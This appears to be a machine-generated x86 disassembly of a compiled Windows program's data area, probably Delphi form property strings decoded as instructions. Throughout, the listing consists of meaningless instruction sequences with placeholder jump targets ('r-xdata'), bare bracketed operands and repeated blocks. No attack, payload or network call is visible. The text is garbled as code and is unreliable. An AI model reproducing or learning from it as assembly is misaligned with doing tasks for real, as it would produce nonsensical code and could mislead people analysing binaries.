movsb [ edi ] [ esi ]
inc ebx
add ah ch
jo r-xdata
add bh bh
cmpsb [ fs : esi ] [ edi ]
inc ebx
add [ esi + 0x43 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040016 ] al
outsd
outsb
je r-xdata
jb r-xdata
add [ eax ] al
and [ ebx ] 0x0
or cl [ edi + 0x6e ]
inc esp
jb r-xdata
push edi
jb r-xdata
movsb [ edi ] [ esi ]
add [ eax ] eax
dec [ edi + ecx + 0x10044 ]
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
push ds
add [ edi ] al
push esp
popad
bound edx [ ebx + 0x74 ]
outsd
jo r-xdata
outsb
jne r-xdata
insb
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
push esi
inc ebx
add [ ebx - 0x64010000 ] bl
add [ eax ] al
inc [ ecx ]
add [ eax ] 0x0
add [ eax + 0x4f090026 ] al
inc esp
jb r-xdata
jo r-xdata
lds eax [ ebx ]
add [ eax ] al
add [ eax + 0x1 ] al
pop ds
add [ edi ] al
push esi
imul esi [ ebx + 0x69 ] 0x656c62
adc [ eax ] al
or [ edx ] eax
add bh bh
sbb al 0x38
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and [ eax ] al
or [ edi + 0x6f ] dl
jb r-xdata
adc [ eax ] al
push edi
add [ eax ] al
call [ eax - 0x13ffbc5c ]
adc [ eax ] al
cdq
add [ eax ] al
inc eax
cmpsb [ esi ] [ edi ]
inc ebx
add [ eax + 0x43a6 ] cl
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5308001c ] al
push 0x6948776f
outsb
je r-xdata
dec ebx
jns r-xdata
or [ bx ] dl
inc ecx
add al al
add [ eax ] eax
inc eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
pop ss
jo r-xdata
add [ eax ] eax
dec [ esi + eax * 8 ]
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070021 ] al
pop ss
inc ecx
add [ eax ] ah
add [ eax ] eax
jmp [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
push edi
inc ebx
add ah dh
push cs
inc esp
add [ edi + ecx + 0x44 ] dh
add [ ecx ] al
outsb
dec ebx
jns r-xdata
outsd
ja r-xdata
jns r-xdata
jb r-xdata
inc esp
pop edx
inc ebx
add al dh
add [ eax ] al
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0024 ] al
outsb
inc esp
jb r-xdata
outsd
arpl [ ebx + 0x74 ] bp
add [ eax ] al
js r-xdata
loopne r-xdata
jo r-xdata
pop ecx
inc ebx
add al bl
add [ eax ] al
or [ edx + 0x43 ] bl
add al ah
add [ eax ] eax
jmp eax
fadd [ eax ]
add bh bh
fadd [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub eax 0x6e4f0b00
jb r-xdata
add [ eax ] eax
pop ss
inc ecx
add al cl
add [ eax ] eax
dec eax
add [ eax + 0x4f070027 ] al
add [ eax ] al
dec edi
jbe r-xdata
pop ebx
inc ebx
add [ eax ] bl
add [ eax ] eax
[ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
push eax
outsd
jo r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ cs : ecx ] cl
dec edi
outsb
dec ebp
outsd
jne r-xdata
add al ch
pop eax
inc ebx
add al dl
add [ eax ] al
call eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b002c ] al
outsb
dec ebp
outsd
jne r-xdata
popad
dec ebp
outsd
jbe r-xdata
dec ebp
outsd
jne r-xdata
dec edi
outsb
jae r-xdata
jns r-xdata
je r-xdata
outsb
inc ebp
outsb
je r-xdata
jb r-xdata
outsb
inc ebp
outsb
inc esp
jb r-xdata
add bh bh
sbb [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ es : ecx ] cl
dec edi
jo r-xdata
push ebp
push ebp
jo r-xdata
arpl [ ebx + 0x2c ] bp
pop ebx
inc ebx
add [ eax ] dl
add [ eax ] eax
call [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
inc esp
outsd
ja r-xdata
add [ eax ] al
add [ eax ] al
add al cl
sbb al [ ebx ]
je r-xdata
outsb
dec edi
loopne r-xdata
add [ eax ] al
jmp eax
add [ eax ] eax
mov esp 0xe8004359
or [ edi ] dl
pop ecx
inc ebx
add al bl
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f060028 ] al
outsb
inc ebp
js r-xdata
add [ eax + 0x4f090025 ] al
outsb
inc ebp
outsb
inc esp
pop ebx
inc ebx
add [ eax ] cl
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
outsb
inc ebx
insb
imul esp [ ebx + 0x6b ] r-xdata
xor [ ecx ] al
add bh bh
xor [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and al [ eax ]
push cs
dec edi
outsb
inc ebx
outsd
outsb
je r-xdata
and [ eax ] eax
pop es
dec edi
pop edx
inc ebx
add al ch
add [ eax ] al
add [ esi + eax * 8 ] ch
inc ebx
add [ esi + eax * 2 + 0x41 ] dl
jns r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0030 ] al
pop ebp
inc ebx
add [ eax ] al
add [ eax ] eax
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b002f ] al
outsb
push ebx
je r-xdata
add [ ebx + ebx ] al
jb r-xdata
pop eax
push es
add al ah
cmp al 0x43
add al ah
fiadd [ ebx ]
cmp al 0x3d
inc ebx
add [ eax - 0x6bffbc1e ] dl
loop r-xdata
add [ ebx + ebx * 4 ] dl
inc ecx
add ah dh
xor eax [ eax ]
shr al 0x1
inc ebx
add [ eax ] dh
xor [ eax ] eax
dec esp
xor [ eax ] eax
test al 0xcb
inc ebx
add [ eax + 0x18 ] dh
inc esp
add [ eax + 0x540043e0 ] bl
inc esi
inc ecx
add [ eax ] bl
adc [ ebx ] eax
shl [ ecx + 0x33ec0041 ] 0x40
je r-xdata
push ebx
je r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
xor [ eax ] al
or ecx [ edi + 0x6e ]
inc ebx
add al ah
inc ebx
add [ eax - 0x66 ] al
inc ebx
add [ ebp + ecx * 8 + 0x43 ] cl
add [ eax - 0x5d ] bl
inc ebx
add al bl
mov eax [ 0xffffffff9ec00041 ]
sub al 0xc6
or [ fs : ebx + 0x74 ] dl
inc ebx
je r-xdata
inc edi
jb r-xdata
or [ fs : ebx + 0x62 ] ah
jb r-xdata
adc al 0x2
add [ eax ] al
sbb [ ecx ] dl
inc ebx
add al al
inc esp
jb r-xdata
add [ eax ] al
add [ eax ] al
insb
sbb al 0x43
outsd
add [ esp + edi + 0x43 ] al
add al bl
cmp eax [ ebx ]
andps xmm0 [ ebx + 0x75 ]
jae r-xdata
and [ esi ] bh
inc ebx
add [ ecx + 0x43 ] cl
add ah dh
loopne r-xdata
mov eax [ 0x33ec0041 ]
inc eax
outsb
arpl [ eax + 0x65 ] bp
arpl [ ebx + 0x65 ] bp
or [ fs : ebx + 0x62 ] esp
inc ebx
push 0x656b6365
or [ fs : ebx + 0x62 ] ah
add [ eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ ecx + ebx + 0x43 ] bl
add [ ebx ] cl
arpl [ edx + 0x55 ] sp
inc ecx
add [ eax - 0x1fffbe62 ] bh
mov eax [ 0x3b6c0041 ]
inc ebx
add [ ebx + edx + 0x18a00044 ] al
inc esp
add ah ch
pop ss
inc esp
add [ eax + ebx * 4 + 0xe000043 ] dh
inc esp
add [ eax ] ah
push cs
inc esp
add [ eax ] bh
or eax [ eax + eax - 0x4 ]
xchg edi eax
inc ebx
add [ eax ] al
cwde
inc ebx
add ah bh
mov [ ebx ] sub_43c828
inc eax
mov [ 0xffffffff99780043 ] eax
inc ebx
add ah cl
movsb [ edi ] [ esi ]
inc ebx
add [ esp + 0x43 ] al
add [ eax - 0x59 ] bl
inc ebx
add [ esi ] al
inc ebx
add [ eax ] cl
aaa
inc ebx
add [ eax + ecx * 8 + 0xb8c0043 ] ch
inc esp
add [ eax + 0xc ] cl
inc esp
add [ edi + eax + 0x44 ] al
add [ esp + ecx ] ch
inc esp
add ah al
int 0x43
add [ eax - 0x2c ] bl
inc ebx
add al bh
loope r-xdata
sahf
insb
jae r-xdata
inc ebx
add [ eax ] al
add [ eax ] al
inc eax
add ah dh
sbb [ ebx ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al 0x1b
inc esp
out dx al
sbb al [ ebx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
enter 0x431a 0x0
pushad
sbb [ ebx ] eax
add ecx [ esi ]
push esp
inc ebx
push 0x426b6365
outsd
js r-xdata
imul eax [ edx + 0x6f ] 0x78
mov eax eax
jl r-xdata
add al ah
cmp al 0x43
add al ah
fiadd [ ebx ]
cmp al 0x3d
inc ebx
add [ eax - 0x6bffbc1e ] dl
loop r-xdata
inc ebx
rol [ ebx + ebx ] 0x43
add [ edi ] al
andps xmm0 [ ebx + 0x75 ]
jae r-xdata
fdivr [ ebx ]
inc ebx
add [ edi ] cl
push esp
inc ebx
jne r-xdata
mov al 0x11
mov ebp 0xffcaffeb
push 0x7c00433d
cmp eax 0x3d840043
inc ebx
add [ eax ] ah
inc ebx
add [ ebp + ecx + 0x44 ] ch
add [ ebx + ebp * 8 ] bh
inc ebx
add [ esi + ebx + 0x9e80044 ] ch
inc esp
add al bl
or al 0x44
add [ eax + 0x3c ] bl
inc ebx
add [ eax + 0x3c ] bh
inc ebx
add [ esp + edi ] al
inc ebx
add [ esi ] al
add [ 0x6b01000 ] al
outsd
je r-xdata
inc ebx
add [ edi ] al
js r-xdata
add [ ecx + 0x43 ] cl
add ah dh
loopne r-xdata
add [ ebx + ebx * 4 ] dl
outsd
add [ eax ] al
je r-xdata
add [ ecx ] ah
add bh bh
les ebx [ eax - 0x669fffbd ]
inc ebx
add [ eax ] al
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
sldt [ edi ]
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
insb
jae r-xdata
inc esp
add ah al
int 0x43
add [ eax - 0x2c ] bl
inc ebx
add al bh
loope r-xdata
sub al 0xc
sbb eax [ ebx ]
add [ ebx ] bl
inc ebx
add [ esi ] dh
add [ eax ] cl
push ebx
je r-xdata
add [ ebp + ecx + 0x44 ] ch
add [ ebx + ebp * 8 ] bh
inc ebx
add [ esi + ebx + 0x9e80044 ] ch
inc esp
add al bl
or al 0x44
add [ eax + 0x3c ] bl
inc ebx
add [ eax + 0x3c ] bh
inc ebx
add [ esp + edi ] al
inc ebx
add [ ecx ] cl
push esp
inc ebx
push 0x426b6365
outsd
js r-xdata
je r-xdata
sbb [ ebx ] eax
pushad
adc al [ ebx ]
or al 0x0
or [ ebx + 0x74 ] dl
inc ebx
je r-xdata
add [ eax ] al
insd
inc ebx
push 0x426b6365
outsd
js r-xdata
sub al 0xa7
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43050013 ] al
outsd
insb
outsd
jb r-xdata
rcl [ 0x5f0041 ] 0x0
push [ eax ]
add dh bh
xchg esp eax
cmpsb [ esi ] [ edi ]
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x42080010 ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0x2465646f
push edi
cmp al 0x43
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or eax 0x6c410900
imul esp [ edi + 0x6e ] 0x746e656d
add [ eax ] dl
inc eax
add [ ecx ] dl
add al [ eax ]
call [ ecx ]
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ ebx + ebp + 0x41 ] ch
add [ eax + eax ] bh
add dh bh
in al 0x98
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4106000c ] al
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
cwde
adc eax 0x2100041
add bh bh
cmp al 0x43
push cs
add [ ebx ] cl
inc ecx
insb
insb
outsd
ja r-xdata
inc ebx
add [ eax - 0x59 ] bl
inc ebx
add [ esi ] al
inc ebx
add [ eax ] cl
aaa
inc ebx
add [ eax + ecx * 8 + 0xb8c0043 ] ch
inc esp
add [ eax + 0xc ] cl
inc esp
add [ edi + eax + 0x44 ] al
add [ esp + ecx ] ch
inc ebx
or [ ebx + eax * 2 + 0x68 ] edx
arpl [ gs : ebx + 0x42 ] bp
outsd
sar [ esp + ebx + 0x43 ] 0x0
pop es
inc ecx
add ah dh
xor eax [ eax ]
shr al 0x1
inc ebx
add [ eax ] dh
xor [ eax ] eax
dec esp
xor [ eax ] eax
test al 0xcb
inc ebx
add [ eax + 0x18 ] dh
add ah ch
xor eax [ eax ]
adc al 0x9b
insd
inc ebx
push 0x426b6365
outsd
js r-xdata
jo r-xdata
insb
jae r-xdata
jae r-xdata
pop eax
inc ebx
add [ eax + eax ] dh
inc [ edx + ecx * 8 + 0x43 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b0014 ] al
outsd
outsb
jae r-xdata
push cs
inc esp
add [ esi + ecx + 0x44 ] bh
add [ eax - 0x80000000 ] al
adc eax 0x74430500
insb
imul ebp [ edi + 0x6e ] r-xdata
enter 0x0 0xfe
int3
inc ebx
add [ eax - 0x5b ] dh
inc ebx
add [ eax + 0x6c0043a5 ] ah
lds eax [ ebx ]
add [ eax ] al
add [ eax - 0x80000000 ] al
adc [ eax ] eax
pop es
outsd
and al 0x57
jb r-xdata
inc ebx
add al bl
mov eax [ 0xffffffff9ec00041 ]
inc ecx
add [ eax - 0x1fffbe62 ] bh
mov eax [ 0x3b6c0041 ]
inc ebx
add [ ebx + edx + 0x18a00044 ] al
inc esp
add ah ch
pop ss
inc esp
add [ eax + ebx * 4 + 0xe000043 ] dh
inc esp
add [ eax ] ah
push cs
inc esp
add [ eax ] bh
or eax [ eax + eax - 0x4 ]
xchg edi eax
inc ebx
add [ eax ] al
cwde
inc ebx
add ah bh
mov [ ebx ] sub_43c828
inc eax
mov [ 0xffffffff99780043 ] eax
inc ebx
add ah cl
movsb [ edi ] [ esi ]
inc ebx
add [ esp + 0x43 ] al
inc esp
add [ eax + 0x540043e0 ] bl
inc esi
inc ecx
add [ esi + eax * 8 ] ch
inc ebx
add [ eax - 0x66 ] al
inc ebx
add [ ebp + ecx * 8 + 0x43 ] cl
add [ eax - 0x5d ] bl
add [ eax ] dl
inc eax
add [ ecx + eax + 0xf8cff00 ] ah
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or eax [ eax ]
pop es
push esp
popad
bound edx [ ebx + 0x74 ]
outsd
jo r-xdata
add [ eax ] al
adc [ eax ] al
movsb [ edi ] [ esi ]
add [ eax ] eax
dec [ edi + ecx + 0x10044 ]
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
adc [ eax ] al
movsd [ edi ] [ esi ]
add [ eax ] eax
[ eax - 0x43ffbbf2 ]
push cs
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43050015 ] al
je r-xdata
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sbb [ eax ] al
or [ edx + esi * 2 + 0x61 ] al
dec ebp
outsd
add [ gs : eax ] dl
jb r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
push ss
add [ edx ] cl
inc esp
jb r-xdata
inc ebx
add [ edi ] al
jns r-xdata
sbb eax [ ebx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jl r-xdata
inc eax
add [ eax ] dl
add dh bh
add [ fs : eax ] al
dec [ ebp + eax * 8 + 0x43 ]
add [ eax + 0x1 ] al
add [ gs : eax ] dl
xor eax [ esp + edi + 0x50 ]
inc ebx
add [ edx ] bh
add bh bh
jpe r-xdata
adc [ eax ] al
pushad
add [ eax ] al
[ eax + eax ]
pop ss
add [ eax ] cl
inc esp
jb r-xdata
imul ebp [ esi + 0x74 ] 0x40100073
add [ ebp - 0x6700ffff ] ah
sbb [ eax ] eax
pop es
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
push esp
mov ch 0x41
add [ eax ] ch
add [ eax ] eax
add [ eax ] al
inc ebx
jne r-xdata
jl r-xdata
inc ecx
add [ eax ] bl
add al [ eax ]
add [ eax - 0x3fffbce7 ] ch
mov eax [ 0x33ec0041 ]
inc eax
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + ebx + 0x43 ] ch
outsd
outsb
je r-xdata
sbb [ edx ] 0x0
add al 0x46
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
jmp [ esi + 0x43 ]
jae r-xdata
popad
jo r-xdata
add [ eax ] al
add [ eax + 0x43070011 ] al
inc ebx
add bh bh
cmpsb [ fs : esi ] [ edi ]
inc ebx
add [ esi + 0x43 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4604001a ] al
jb r-xdata
push esi
inc ebx
add [ ebx - 0x64010000 ] bl
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sub_431290
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
in al dx
adc eax [ ebx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
lodsb [ esi ]
adc eax [ ebx ]
ficom [ ebx ]
inc ebx
add [ eax ] bl
add al [ eax ]
add [ eax ] bl
adc [ ebx ] eax
shl [ ecx + 0x33ec0041 ] 0x40
add [ ebx + ebx * 4 ] dl
inc ecx
add ah dh
xor eax [ eax ]
shr al 0x1
inc ebx
add [ eax ] dh
xor [ eax ] eax
dec esp
xor [ eax ] eax
test al 0xcb
inc ebx
add [ eax + 0x18 ] dh
inc esp
add [ eax + 0x540043e0 ] bl
inc esi
inc ecx
add [ esi + eax * 8 ] ch
inc ebx
add [ eax - 0x66 ] al
inc ebx
add [ ebp + ecx * 8 + 0x43 ] cl
add [ eax - 0x5d ] bl
inc ebx
add al bl
mov eax [ 0xffffffff9ec00041 ]
inc ecx
add [ eax - 0x1fffbe62 ] bh
mov eax [ 0x38300041 ]
inc ebx
add [ ebx + edx + 0x18a00044 ] al
inc esp
add ah ch
pop ss
inc esp
add [ eax + ebx * 4 + 0xe000043 ] dh
inc esp
add [ eax ] ah
push cs
inc esp
add [ eax ] bh
or eax [ eax + eax - 0x4 ]
xchg edi eax
inc ebx
add [ eax ] al
cwde
inc ebx
add ah bh
mov [ ebx ] sub_43c828
inc eax
mov [ 0xffffffff99780043 ] eax
inc ebx
add ah cl
movsb [ edi ] [ esi ]
inc ebx
add [ esp + 0x43 ] al
add [ eax - 0x59 ] bl
inc ebx
add [ esi ] al
inc ebx
add [ eax ] cl
aaa
inc ebx
add [ eax + ecx * 8 + 0xb8c0043 ] ch
inc esp
add [ eax + 0xc ] cl
inc esp
add [ edi + eax + 0x44 ] al
add [ esp + ecx ] ch
inc esp
add ah al
int 0x43
add [ eax - 0x2c ] bl
inc ebx
add al bh
loope r-xdata
pop es
add [ ecx + edi + 0x43 ] al
add al ah
fiadd [ ebx ]
cmp [ ecx ] 0x43
add [ eax - 0x6bffbc1e ] dl
loop r-xdata
dec eax
[ ecx + edi + 0x3a1c0043 ]
mov al [ 0xffffffff9800433a ]
cmp [ ebx ] eax
add [ ecx + 0x43 ] cl
add ah dh
loopne r-xdata
add dh bh
xchg esp eax
cmpsb [ esi ] [ edi ]
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
je r-xdata
and [ ebx ] bh
inc ebx
add ah dh
cmp al [ ebx ]
xchg esp eax
cmp [ ebx ] al
mov eax 0x7004338
push esp
inc edx
jne r-xdata
mov al 0x11
mov ebp 0x14bd35
jmp r-xdata
add [ ebp + ecx + 0x44 ] ch
add [ ebx + ebp * 8 ] bh
inc ebx
add [ esi + ebx + 0x9e80044 ] ch
inc esp
add al bl
or al 0x44
add al ah
inc ebx
add [ edi + esi ] al
inc ebx
add [ eax + edi + 0x80043 ] bh
add eax 0x7b006b0
fwait
add [ eax ] al
[ ebx + 0x1ff0000 ]
imul ebp [ edi + 0x6e ] r-xdata
je r-xdata
push [ eax ]
outsb
mov eax eax
in al dx
adc eax [ ebx ]
pop es
pop es
push esp
inc edx
jne r-xdata
add bh bh
inc esp
0x43
imul eax [ ecx + ebp * 2 + 0x4d ] 0x65646f
adc [ eax ] al
adc [ edx ] eax
add bh bh
add [ eax ] cl
inc edx
je r-xdata
add [ eax + 0x4208000d ] al
outsb
fcom [ edx ]
inc ebx
add [ eax + 0x12 ] ah
inc ebx
add [ ecx ] dh
add [ eax ] cl
push ebx
je r-xdata
push cs
add [ esi ] al
inc ebx
popad
outsb
arpl [ ebp + 0x6c ] sp
and al 0x57
inc ebx
add [ eax - 0x5b ] dh
inc ebx
add [ eax + 0x6c0043a5 ] ah
lds eax [ ebx ]
add [ eax ] al
add [ eax - 0x80000000 ] al
sldt [ edi ]
inc ebx
popad
jo r-xdata
or [ edx + 0x69 ] al
inc esp
imul ecx [ ebp + 0x6f ] 0x10006564
inc eax
add [ ecx ] dl
add al [ eax ]
call [ ecx ]
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
inc ebx
je r-xdata
adc [ edx ] eax
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
insb
jae r-xdata
popad
add [ eax ] al
inc esp
cwde
inc ebx
add [ eax - 0x67 ] ah
add [ ebx + ebp + 0x41 ] ch
add [ eax + eax ] bh
add dh bh
in al 0x98
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4106000b ] al
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
jl r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b0010 ] al
outsd
outsb
jae r-xdata
rcl [ 0x5f0041 ] 0x0
add [ eax ] al
add [ eax ] al
inc ebx
add [ eax ] al
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
or al 0x0
pop es
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
inc ebx
add [ ecx ] ah
add bh bh
les ebx [ eax - 0x669fffbd ]
pop ebp
add [ eax ] al
jmp [ eax ]
jb r-xdata
add [ eax ] al
imul ebp [ esi + 0x74 ] 0x40100073
add [ eax ] dl
add al [ eax ]
call [ eax ]
cmp [ ebx ] eax
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] eax
pop es
inc esp
popa
jne r-xdata
add [ eax ] dl
inc eax
add [ eax ] dl
add dh bh
add [ fs : eax ] al
dec [ ebp + eax * 8 + 0x43 ]
add [ eax + 0x1 ] al
adc eax 0x6e450700
popad
bound ebp [ ebp + 0x64 ]
push esp
mov ch 0x41
add [ eax ] ch
je r-xdata
jae r-xdata
push eax
inc ebx
add [ edx + eax ] dl
add bh bh
adc al 0x2
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop ss
add [ ebx ] cl
dec ebp
outsd
popad
insb
push edx
adc eax [ eax ]
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
push eax
inc ebx
add [ edx ] bh
add bh bh
jpe r-xdata
dec eax
imul ebp [ esi + 0x74 ] r-xdata
jl r-xdata
insb
je r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
adc al [ eax ]
or al [ edx + esi * 2 + 0x61 ]
inc ebx
jne r-xdata
add bh bh
sub [ ebp + 0x10043 ] ah
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sbb eax [ eax ]
or [ eax + 0x6f ] edx
jo r-xdata
adc [ eax ] al
pushad
add [ eax ] al
[ eax + eax ]
jmp [ esi + 0x43 ]
jae r-xdata
nop
movsb [ edi ] [ esi ]
inc ebx
add ah ch
jo r-xdata
add bh bh
cmpsb [ fs : esi ] [ edi ]
inc ebx
add [ esi + 0x43 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040016 ] al
outsd
outsb
je r-xdata
jb r-xdata
add [ eax ] al
and [ ebx ] 0x0
or cl [ edi + 0x6e ]
inc esp
jb r-xdata
push edi
jb r-xdata
movsb [ edi ] [ esi ]
add [ eax ] eax
dec [ edi + ecx + 0x10044 ]
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
push ds
add [ edi ] al
push esp
popad
bound edx [ ebx + 0x74 ]
outsd
jo r-xdata
outsb
jne r-xdata
insb
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
push esi
inc ebx
add [ ebx - 0x64010000 ] bl
add [ eax ] al
inc [ ecx ]
add [ eax ] 0x0
add [ eax + 0x4f090026 ] al
inc esp
jb r-xdata
jo r-xdata
lds eax [ ebx ]
add [ eax ] al
add [ eax + 0x1 ] al
pop ds
add [ edi ] al
push esi
imul esi [ ebx + 0x69 ] 0x656c62
adc [ eax ] al
or [ edx ] eax
add bh bh
sbb al 0x38
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and [ eax ] al
or [ edi + 0x6f ] dl
jb r-xdata
adc [ eax ] al
push edi
add [ eax ] al
call [ eax - 0x13ffbc5c ]
adc [ eax ] al
cdq
add [ eax ] al
inc eax
cmpsb [ esi ] [ edi ]
inc ebx
add [ eax + 0x43a6 ] cl
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5308001c ] al
push 0x6948776f
outsb
je r-xdata
dec ebx
jns r-xdata
or [ bx ] dl
inc ecx
add al al
add [ eax ] eax
inc eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
pop ss
jo r-xdata
add [ eax ] eax
dec [ esi + eax * 8 ]
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070021 ] al
pop ss
inc ecx
add [ eax ] ah
add [ eax ] eax
jmp [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
push edi
inc ebx
add ah dh
push cs
inc esp
add [ edi + ecx + 0x44 ] dh
add [ ecx ] al
outsb
dec ebx
jns r-xdata
outsd
ja r-xdata
jns r-xdata
jb r-xdata
inc esp
pop edx
inc ebx
add al dh
add [ eax ] al
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0024 ] al
outsb
inc esp
jb r-xdata
outsd
arpl [ ebx + 0x74 ] bp
add [ eax ] al
js r-xdata
loopne r-xdata
jo r-xdata
pop ecx
inc ebx
add al bl
add [ eax ] al
or [ edx + 0x43 ] bl
add al ah
add [ eax ] eax
jmp eax
fadd [ eax ]
add bh bh
fadd [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub eax 0x6e4f0b00
jb r-xdata
add [ eax ] eax
pop ss
inc ecx
add al cl
add [ eax ] eax
dec eax
add [ eax + 0x4f070027 ] al
add [ eax ] al
dec edi
jbe r-xdata
pop ebx
inc ebx
add [ eax ] bl
add [ eax ] eax
[ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
push eax
outsd
jo r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ cs : ecx ] cl
dec edi
outsb
dec ebp
outsd
jne r-xdata
add al ch
pop eax
inc ebx
add al dl
add [ eax ] al
call eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b002c ] al
outsb
dec ebp
outsd
jne r-xdata
popad
dec ebp
outsd
jbe r-xdata
dec ebp
outsd
jne r-xdata
dec edi
outsb
jae r-xdata
jns r-xdata
